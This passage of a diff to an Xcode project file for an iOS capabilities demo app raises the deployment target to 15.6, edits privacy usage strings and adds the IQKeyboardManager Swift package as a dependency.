 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				IPHONEOS_DEPLOYMENT_TARGET = 15;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -1091,16 +1169,17 @@
 				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 27A2DW4KWX;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = AllCapabilitiesDemo/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = AppCapabilitiesDemo;
 				INFOPLIST_KEY_NSCameraUsageDescription = "We need camera access to track your head movement.";
 				INFOPLIST_KEY_NSHealthShareUsageDescription = "To Share Health Related Data to this app";
 				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "For Location";
-				INFOPLIST_KEY_NSSiriUsageDescription = "Allows CoffeeApp to process coffee orders via Siri.";
+				INFOPLIST_KEY_NSSiriUsageDescription = "We need Siri to order coffee with voice commands.";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				IPHONEOS_DEPLOYMENT_TARGET = 15;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -1242,6 +1321,25 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+/* Begin XCRemoteSwiftPackageReference section */
+		51B526032E44E7B900999ABE /* XCRemoteSwiftPackageReference "IQKeyboardManager" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/hackiftekhar/IQKeyboardManager.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 8.0.1;
+			};
+		};
+/* End XCRemoteSwiftPackageReference section */
+
+/* Begin XCSwiftPackageProductDependency section */
+		51B526042E44E7B900999ABE /* IQKeyboardManagerSwift */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 51B526032E44E7B900999ABE /* XCRemoteSwiftPackageReference "IQKeyboardManager" */;
+			productName = IQKeyboardManagerSwift;
+		};
+/* End XCSwiftPackageProductDependency section */
 	};
 	rootObject = BD2ECEB42D0841CA00639E0D /* Project object */;
 }
